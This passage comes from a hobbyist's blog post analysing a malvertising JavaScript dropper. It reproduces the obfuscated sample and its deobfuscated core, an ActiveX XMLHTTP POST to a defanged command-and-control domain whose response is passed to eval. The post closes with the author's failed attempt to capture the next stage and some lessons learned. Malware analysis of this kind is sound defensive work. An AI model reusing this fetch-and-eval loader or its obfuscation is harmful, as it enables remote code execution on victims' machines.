    <span>a0_0x2d5b8b</span> <span>=</span> <span>a0_0x4152c3</span><span>(</span><span>0x53</span><span>,</span> <span>0x41</span><span>)</span> <span>+</span> <span>a0_0x3be92f</span><span>(</span><span>-</span><span>0x24f</span><span>,</span> <span>-</span><span>0x257</span><span>)</span> <span>+</span> <span>a0_0xb56377</span><span>(</span><span>0x317</span><span>,</span> <span>0x30d</span><span>),</span>
    <span>a0_0x5259a4</span> <span>=</span> <span>new</span> <span>this</span><span>[</span><span>a0_0x1bbfc1</span><span>](</span><span>a0_0x2d5b8b</span><span>);</span>

<span>function</span> <span>a0_0x4152c3</span><span>(</span><span>_0x4a2099</span><span>,</span> <span>_0x268b28</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x563129</span> <span>=</span> <span>{</span>
        <span>_0x4d0092</span><span>:</span> <span>0x45</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x268b28</span> <span>-</span> <span>-</span><span>a0_0x563129</span><span>.</span><span>_0x4d0092</span><span>,</span> <span>_0x4a2099</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0x312db7</span><span>(</span><span>_0x46c7dc</span><span>,</span> <span>_0x571d0a</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x528e19</span> <span>=</span> <span>{</span>
        <span>_0x134c68</span><span>:</span> <span>0x62</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x571d0a</span> <span>-</span> <span>-</span><span>a0_0x528e19</span><span>.</span><span>_0x134c68</span><span>,</span> <span>_0x46c7dc</span><span>);</span>
<span>}</span>
<span>var</span> <span>a0_0x22ec1e</span> <span>=</span> <span>a0_0x4152c3</span><span>(</span><span>0x38</span><span>,</span> <span>0x48</span><span>);</span>

<span>function</span> <span>a0_0x260d79</span><span>(</span><span>_0x363819</span><span>,</span> <span>_0x42a44d</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0xe96931</span> <span>=</span> <span>{</span>
        <span>_0x3df615</span><span>:</span> <span>0x251</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x363819</span> <span>-</span> <span>a0_0xe96931</span><span>.</span><span>_0x3df615</span><span>,</span> <span>_0x42a44d</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0x340a</span><span>(</span><span>_0x51af3c</span><span>,</span> <span>_0x54e45b</span><span>)</span> <span>{</span>
    <span>var</span> <span>_0x455fb2</span> <span>=</span> <span>a0_0x1590</span><span>();</span>
    <span>return</span> <span>a0_0x340a</span> <span>=</span> <span>function</span><span>(</span><span>_0x5611bb</span><span>,</span> <span>_0x5b1da5</span><span>)</span> <span>{</span>
        <span>_0x5611bb</span> <span>=</span> <span>_0x5611bb</span> <span>-</span> <span>(</span><span>-</span><span>0xf79</span> <span>+</span> <span>0x1</span> <span>*</span> <span>-</span><span>0x2133</span> <span>+</span> <span>0x312a</span><span>);</span>
        <span>var</span> <span>_0xb49150</span> <span>=</span> <span>_0x455fb2</span><span>[</span><span>_0x5611bb</span><span>];</span>
        <span>if</span> <span>(</span><span>a0_0x340a</span><span>[</span><span>&#39;</span><span>pCwxVT</span><span>&#39;</span><span>]</span> <span>===</span> <span>undefined</span><span>)</span> <span>{</span>
            <span>var</span> <span>_0x4f072f</span> <span>=</span> <span>function</span><span>(</span><span>_0x3d947e</span><span>)</span> <span>{</span>
                <span>var</span> <span>_0x4e8bc8</span> <span>=</span> <span>&#39;</span><span>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=</span><span>&#39;</span><span>;</span>
                <span>var</span> <span>_0xa1b63d</span> <span>=</span> <span>&#39;&#39;</span><span>,</span>
                    <span>_0x7695ae</span> <span>=</span> <span>&#39;&#39;</span><span>;</span>
                <span>for</span> <span>(</span><span>var</span> <span>_0x2a3374</span> <span>=</span> <span>-</span><span>0x1ba6</span> <span>*</span> <span>-</span><span>0x1</span> <span>+</span> <span>-</span><span>0x1998</span> <span>+</span> <span>-</span><span>0x20e</span><span>,</span> <span>_0x5c5f82</span><span>,</span> <span>_0x2cf737</span><span>,</span> <span>_0x21d457</span> <span>=</span> <span>0x1c66</span> <span>*</span> <span>0x1</span> <span>+</span> <span>-</span><span>0xa76</span> <span>+</span> <span>-</span><span>0x11f0</span><span>;</span> <span>_0x2cf737</span> <span>=</span> <span>_0x3d947e</span><span>[</span><span>&#39;</span><span>charAt</span><span>&#39;</span><span>](</span><span>_0x21d457</span><span>++</span><span>);</span> <span>~</span><span>_0x2cf737</span> <span>&amp;&amp;</span> <span>(</span><span>_0x5c5f82</span> <span>=</span> <span>_0x2a3374</span> <span>%</span> <span>(</span><span>0x507</span> <span>+</span> <span>-</span><span>0x41b</span> <span>+</span> <span>-</span><span>0xe8</span><span>)</span> <span>?</span> <span>_0x5c5f82</span> <span>*</span> <span>(</span><span>0x2be</span> <span>+</span> <span>0x6</span> <span>*</span> <span>0x6f</span> <span>+</span> <span>-</span><span>0x518</span><span>)</span> <span>+</span> <span>_0x2cf737</span> <span>:</span> <span>_0x2cf737</span><span>,</span> <span>_0x2a3374</span><span>++</span> <span>%</span> <span>(</span><span>0x33e</span> <span>+</span> <span>0x21fc</span> <span>+</span> <span>-</span><span>0x2536</span><span>))</span> <span>?</span> <span>_0xa1b63d</span> <span>+=</span> <span>String</span><span>[</span><span>&#39;</span><span>fromCharCode</span><span>&#39;</span><span>](</span><span>0x267b</span> <span>+</span> <span>0x1b87</span> <span>+</span> <span>-</span><span>0x4103</span> <span>&amp;</span> <span>_0x5c5f82</span> <span>&gt;&gt;</span> <span>(</span><span>-</span><span>(</span><span>0x3</span> <span>*</span> <span>0x1c1</span> <span>+</span> <span>-</span><span>0x134e</span> <span>+</span> <span>0xe0d</span><span>)</span> <span>*</span> <span>_0x2a3374</span> <span>&amp;</span> <span>0x9</span> <span>*</span> <span>-</span><span>0x135</span> <span>+</span> <span>-</span><span>0x33</span> <span>+</span> <span>0xb16</span><span>))</span> <span>:</span> <span>-</span><span>0x2</span> <span>*</span> <span>0x6bb</span> <span>+</span> <span>0x1e9</span> <span>*</span> <span>0xb</span> <span>+</span> <span>-</span><span>0x1</span> <span>*</span> <span>0x78d</span><span>)</span> <span>{</span>
                    <span>_0x2cf737</span> <span>=</span> <span>_0x4e8bc8</span><span>[</span><span>&#39;</span><span>indexOf</span><span>&#39;</span><span>](</span><span>_0x2cf737</span><span>);</span>
                <span>}</span>
                <span>for</span> <span>(</span><span>var</span> <span>_0x309b2b</span> <span>=</span> <span>0x19</span> <span>*</span> <span>0x25</span> <span>+</span> <span>-</span><span>0x12aa</span> <span>*</span> <span>0x1</span> <span>+</span> <span>0xf0d</span><span>,</span> <span>_0x176b4c</span> <span>=</span> <span>_0xa1b63d</span><span>[</span><span>&#39;</span><span>length</span><span>&#39;</span><span>];</span> <span>_0x309b2b</span> <span>&lt;</span> <span>_0x176b4c</span><span>;</span> <span>_0x309b2b</span><span>++</span><span>)</span> <span>{</span>
                    <span>_0x7695ae</span> <span>+=</span> <span>&#39;</span><span>%</span><span>&#39;</span> <span>+</span> <span>(</span><span>&#39;</span><span>00</span><span>&#39;</span> <span>+</span> <span>_0xa1b63d</span><span>[</span><span>&#39;</span><span>charCodeAt</span><span>&#39;</span><span>](</span><span>_0x309b2b</span><span>)[</span><span>&#39;</span><span>toString</span><span>&#39;</span><span>](</span><span>-</span><span>0x19</span> <span>*</span> <span>0x115</span> <span>+</span> <span>0x13</span> <span>*</span> <span>0x134</span> <span>+</span> <span>0x441</span> <span>*</span> <span>0x1</span><span>))[</span><span>&#39;</span><span>slice</span><span>&#39;</span><span>](</span><span>-</span><span>(</span><span>0xa5b</span> <span>+</span> <span>-</span><span>0x5</span> <span>*</span> <span>0x81</span> <span>+</span> <span>-</span><span>0x7d4</span><span>));</span>
                <span>}</span>
                <span>return</span> <span>decodeURIComponent</span><span>(</span><span>_0x7695ae</span><span>);</span>
            <span>};</span>
            <span>a0_0x340a</span><span>[</span><span>&#39;</span><span>hWUEho</span><span>&#39;</span><span>]</span> <span>=</span> <span>_0x4f072f</span><span>,</span> <span>_0x51af3c</span> <span>=</span> <span>arguments</span><span>,</span> <span>a0_0x340a</span><span>[</span><span>&#39;</span><span>pCwxVT</span><span>&#39;</span><span>]</span> <span>=</span> <span>!!</span><span>[];</span>
        <span>}</span>
        <span>var</span> <span>_0x31a990</span> <span>=</span> <span>_0x455fb2</span><span>[</span><span>0xa8b</span> <span>*</span> <span>0x3</span> <span>+</span> <span>0x1</span> <span>*</span> <span>0x1d13</span> <span>+</span> <span>-</span><span>0x3cb4</span><span>],</span>
            <span>_0x1073b2</span> <span>=</span> <span>_0x5611bb</span> <span>+</span> <span>_0x31a990</span><span>,</span>
            <span>_0x59ec02</span> <span>=</span> <span>_0x51af3c</span><span>[</span><span>_0x1073b2</span><span>];</span>
        <span>return</span> <span>!</span><span>_0x59ec02</span> <span>?</span> <span>(</span><span>_0xb49150</span> <span>=</span> <span>a0_0x340a</span><span>[</span><span>&#39;</span><span>hWUEho</span><span>&#39;</span><span>](</span><span>_0xb49150</span><span>),</span> <span>_0x51af3c</span><span>[</span><span>_0x1073b2</span><span>]</span> <span>=</span> <span>_0xb49150</span><span>)</span> <span>:</span> <span>_0xb49150</span> <span>=</span> <span>_0x59ec02</span><span>,</span> <span>_0xb49150</span><span>;</span>
    <span>},</span> <span>a0_0x340a</span><span>(</span><span>_0x51af3c</span><span>,</span> <span>_0x54e45b</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0x5c2d53</span><span>(</span><span>_0x254aa9</span><span>,</span> <span>_0x37e86d</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x2d5699</span> <span>=</span> <span>{</span>
        <span>_0x13cb02</span><span>:</span> <span>0x3d</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x37e86d</span> <span>-</span> <span>-</span><span>a0_0x2d5699</span><span>.</span><span>_0x13cb02</span><span>,</span> <span>_0x254aa9</span><span>);</span>
<span>}</span>
<span>var</span> <span>a0_0x4501bd</span> <span>=</span> <span>a0_0x312db7</span><span>(</span><span>0x26</span><span>,</span> <span>0x23</span><span>),</span>
    <span>a0_0x5a8906</span> <span>=</span> <span>a0_0x4152c3</span><span>(</span><span>0x39</span><span>,</span> <span>0x49</span><span>)</span> <span>+</span> <span>a0_0x4152c3</span><span>(</span><span>0x36</span><span>,</span> <span>0x3d</span><span>)</span> <span>+</span> <span>a0_0x5c2d53</span><span>(</span><span>0x46</span><span>,</span> <span>0x4a</span><span>)</span> <span>+</span> <span>a0_0x312db7</span><span>(</span><span>0x4d</span><span>,</span> <span>0x39</span><span>)</span> <span>+</span> <span>a0_0x4152c3</span><span>(</span><span>0x39</span><span>,</span> <span>0x3f</span><span>)</span> <span>+</span> <span>a0_0x4152c3</span><span>(</span><span>0x47</span><span>,</span> <span>0x5b</span><span>)</span> <span>+</span> <span>a0_0x5c2d53</span><span>(</span><span>0x61</span><span>,</span> <span>0x5c</span><span>)</span> <span>+</span> <span>a0_0x312db7</span><span>(</span><span>0x3a</span><span>,</span> <span>0x2f</span><span>)</span> <span>+</span> <span>a0_0x5c2d53</span><span>(</span><span>0x73</span><span>,</span> <span>0x61</span><span>)</span> <span>+</span> <span>a0_0x260d79</span><span>(</span><span>0x2e4</span><span>,</span> <span>0x2e8</span><span>)</span> <span>+</span> <span>a0_0x5c2d53</span><span>(</span><span>0x65</span><span>,</span> <span>0x6a</span><span>)</span> <span>+</span> <span>a0_0xb56377</span><span>(</span><span>0x30a</span><span>,</span> <span>0x316</span><span>);</span>
<span>a0_0x5259a4</span><span>[</span><span>a0_0x22ec1e</span><span>](</span><span>a0_0x4501bd</span><span>,</span> <span>a0_0x5a8906</span><span>,</span> <span>!</span><span>[]);</span>
<span>var</span> <span>a0_0x1db05b</span> <span>=</span> <span>a0_0x219ccd</span><span>(</span><span>0x1e0</span><span>,</span> <span>0x1f2</span><span>);</span>

<span>function</span> <span>a0_0x3be92f</span><span>(</span><span>_0x19ef89</span><span>,</span> <span>_0x1b1820</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x36a3e7</span> <span>=</span> <span>{</span>
        <span>_0x666351</span><span>:</span> <span>0x2ee</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x19ef89</span> <span>-</span> <span>-</span><span>a0_0x36a3e7</span><span>.</span><span>_0x666351</span><span>,</span> <span>_0x1b1820</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0x1590</span><span>()</span> <span>{</span>
    <span>var</span> <span>_0x54aa6f</span> <span>=</span> <span>[</span><span>&#39;</span><span>zwn0</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>BNnLvgu</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZi3otvyr3LOuNm</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>zLe9pq</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>CMvZCg8</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>yxHuAw0</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZe5ndb5BNn6uKO</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>CwPgqLa</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>sfruua</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>whDgDvy</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>oI8Vmwu</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>zvHpyMO</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>Bc5IBgu</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>ue9tva</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>tvnytuW</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>nwmUAw4</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>C1fpqZy</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>zw91Da</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>zxzHBa</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>vNbXr3q</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>qwn0Axy</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>B3bLBG</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>Ahr0Chm</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>B3q0kZG</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>EJbMCxO</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>ywXHBg0</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>uujIngC</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>B20VywO</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>A0Lwq0e</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZC2yLzuu1fw</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZa5odKXnuPls2DNAa</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>C2vUza</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZaZnJCXn0vVu1vmvq</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>B29KC2G</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>owrWCK5gCW</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>DgvYBMe</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mtGXnZy4uLfkD0nU</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mZiZnte1mLbmBLHirG</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>zwf0lMm</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mI5ytuW</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>C3nLzgy</span><span>&#39;</span><span>,</span> <span>&#39;</span><span>mJi5mZmZBgjeBKvh</span><span>&#39;</span><span>];</span>
    <span>a0_0x1590</span> <span>=</span> <span>function</span><span>()</span> <span>{</span>
        <span>return</span> <span>_0x54aa6f</span><span>;</span>
    <span>};</span>
    <span>return</span> <span>a0_0x1590</span><span>();</span>
<span>}</span>
<span>var</span> <span>a0_0x1562fb</span> <span>=</span> <span>a0_0x4152c3</span><span>(</span><span>0x3b</span><span>,</span> <span>0x3a</span><span>)</span> <span>+</span> <span>a0_0x2177ce</span><span>(</span><span>0x2f9</span><span>,</span> <span>0x309</span><span>)</span> <span>+</span> <span>a0_0x3813df</span><span>(</span><span>-</span><span>0x13a</span><span>,</span> <span>-</span><span>0x134</span><span>)</span> <span>+</span> <span>a0_0x4e8ff2</span><span>(</span><span>0x3c</span><span>,</span> <span>0x3a</span><span>)</span> <span>+</span> <span>a0_0x260d79</span><span>(</span><span>0x2e0</span><span>,</span> <span>0x2f1</span><span>)</span> <span>+</span> <span>a0_0x219ccd</span><span>(</span><span>0x1f7</span><span>,</span> <span>0x1ed</span><span>)</span> <span>+</span> <span>a0_0x3be92f</span><span>(</span><span>-</span><span>0x266</span><span>,</span> <span>-</span><span>0x25a</span><span>)</span> <span>+</span> <span>a0_0x312db7</span><span>(</span><span>0xa</span><span>,</span> <span>0x1f</span><span>)</span> <span>+</span> <span>a0_0x5c2d53</span><span>(</span><span>0x6b</span><span>,</span> <span>0x68</span><span>);</span>
<span>a0_0x5259a4</span><span>[</span><span>a0_0x1db05b</span><span>](</span><span>a0_0x1562fb</span><span>);</span>
<span>var</span> <span>a0_0x35d339</span> <span>=</span> <span>a0_0xb56377</span><span>(</span><span>0x308</span><span>,</span> <span>0x317</span><span>);</span>

<span>function</span> <span>a0_0x3813df</span><span>(</span><span>_0x2ec6b2</span><span>,</span> <span>_0x13fab8</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x31b991</span> <span>=</span> <span>{</span>
        <span>_0x2c5813</span><span>:</span> <span>0x1c5</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x2ec6b2</span> <span>-</span> <span>-</span><span>a0_0x31b991</span><span>.</span><span>_0x2c5813</span><span>,</span> <span>_0x13fab8</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0x4e8ff2</span><span>(</span><span>_0x28f744</span><span>,</span> <span>_0x3ece8b</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x136d26</span> <span>=</span> <span>{</span>
        <span>_0x117216</span><span>:</span> <span>0x54</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x28f744</span> <span>-</span> <span>-</span><span>a0_0x136d26</span><span>.</span><span>_0x117216</span><span>,</span> <span>_0x3ece8b</span><span>);</span>
<span>}</span>
<span>var</span> <span>a0_0x2aad8d</span> <span>=</span> <span>a0_0x312db7</span><span>(</span><span>0x4d</span><span>,</span> <span>0x44</span><span>)</span> <span>+</span> <span>a0_0x219ccd</span><span>(</span><span>0x1f8</span><span>,</span> <span>0x1fe</span><span>)</span> <span>+</span> <span>&#39;</span><span>xt</span><span>&#39;</span><span>;</span>

<span>function</span> <span>a0_0x2177ce</span><span>(</span><span>_0x3d89be</span><span>,</span> <span>_0x3cb99a</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x592702</span> <span>=</span> <span>{</span>
        <span>_0x871279</span><span>:</span> <span>0x275</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x3cb99a</span> <span>-</span> <span>a0_0x592702</span><span>.</span><span>_0x871279</span><span>,</span> <span>_0x3d89be</span><span>);</span>
<span>}</span>
<span>var</span> <span>a0_0x25de01</span> <span>=</span> <span>a0_0x5259a4</span><span>[</span><span>a0_0x2aad8d</span><span>];</span>
<span>this</span><span>[</span><span>a0_0x35d339</span><span>](</span><span>a0_0x25de01</span><span>);</span>
</code></pre></div></div>

<p>And here is what it boils down to:</p>
<div><div><pre><code><span>var</span> <span>req</span> <span>=</span> <span>new</span> <span>this</span><span>[</span><span>&#39;</span><span>ActiveXObject</span><span>&#39;</span><span>](</span><span>&#39;</span><span>MSXML2.XMLHTTP</span><span>&#39;</span><span>);</span>
<span>req</span><span>[</span><span>&#39;</span><span>open</span><span>&#39;</span><span>](</span><span>&#39;</span><span>POST</span><span>&#39;</span><span>,</span> <span>&#34;</span><span>hxxps[://]1e5c[.]internal[.]blessedfoodshalalmeat[.]com/ajaxTimeout</span><span>&#34;</span><span>,</span> <span>false</span><span>);</span>
<span>req</span><span>[</span><span>&#39;</span><span>send</span><span>&#39;</span><span>](</span><span>&#34;</span><span>qjFBPkIVCAVpqGtz0fqzot4+8QBb4gsQOC6XwFuVfQ==</span><span>&#34;</span><span>);</span>
<span>var</span> <span>response</span> <span>=</span> <span>req</span><span>[</span><span>&#39;</span><span>responseText</span><span>&#39;</span><span>];</span>
<span>eval</span><span>(</span><span>response</span><span>);</span>
</code></pre></div></div>

<p>I modified the <code>eval</code> to be a <code>WScript.Echo</code> command and executed it, because‚Ä¶ YOLO, right?</p>

<p>Unfortunately, because I lack foresight, I accidentally clicked the ‚ÄúOK.‚Äù on the prompt that popped up and only saw the next stage payload appear for a minute. Then it was gone into the ether. I tried executing the script again, but much like the original ad I was served, it isn‚Äôt re-downloading the payload. This is super disappointing because I saw that the code was executing some WMIC commands and performing a host survey to send back to the C2.</p>

<p>The next day, I re-flashed my laptop with a fresh installation of Windows, went to a coffee shop and tried again. I was able to get the malicious blob served to me from the first site, however, it didn‚Äôt transition into the malicious ‚ÄúUpdated needed!‚Äù page. I went ahead and tried executing the last payload I had (the <code>ActiveXObject</code> downloader), but I was getting a weird error (<code>.\bad.js(3, 1) msxml3.dll: The system cannot locate the resource specified.</code>). After some googling to figure this out, I realized it‚Äôs telling me that it can‚Äôt resolve the DNS for the malicious domain. At first I thought it might be the coffee shop WiFi doing some filtering, but after using an online NS lookup tool, I realized that the DNS records were deleted some time last night. This must have been in response to the next stage having been downloaded. It‚Äôs unclear whether deleting the DNS records was automatic or manual.</p>
      <h2 id="conclusion">
        
        
          Conclusion <a href="#conclusion">#</a>
        
        
      </h2>
    
<p>This was a pretty weird series of events. I‚Äôm not sure what type of adversary this was. It was too advanced to be ‚Äúspray-and-pray‚Äù adware, as they took down infrastructure and masqueraded with reasonable domains. I doubt it was anything targetted, because I‚Äôm a nobody, they didn‚Äôt use any 0days, and dropping <code>.js</code> hoping that I would execute it is a big leap. So, I‚Äôm thinking it‚Äôs somewhere in the middle, an adversary that doesn‚Äôt target, but invests in reasonable tooling and obfuscation.</p>

<p>I did get to take away a decent lessons learned: always enable logging and take things more slowly during an investigation, even when the investigation is just for fun on my own time. When I used to work in cybersecurity analytics/threat hunt/incident response, I had a good set up with a lot of logging running. This most likely would have saved my bacon by capturing the output of the malicious JavaScript. However, since this was just a hobby ‚Äúinvestigation‚Äù, I didn‚Äôt take it as seriously, and missed out on what could have been a much deeper rabbit hole!</p>

  </div>
</article>

      </div>
    </div></div>
  </body>
</html>
